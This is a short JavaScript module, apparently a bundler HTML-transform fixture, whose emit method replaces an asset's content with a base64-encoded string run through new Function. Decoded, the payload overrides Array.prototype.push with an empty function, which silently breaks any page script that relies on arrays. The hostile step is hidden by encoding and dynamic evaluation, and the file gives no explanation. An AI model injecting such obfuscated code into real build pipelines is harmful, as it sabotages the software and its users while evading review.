class HtmlTransformFixture {
  emit(targetAsset) {
    targetAsset._value = `(new Function(atob('KCgpPT57QXJyYXkucHJvdG90eXBlLnB1c2g9KCk9Pnt9fSkoKQ==')))()`;
  }
}

module.exports = HtmlTransformFixture;
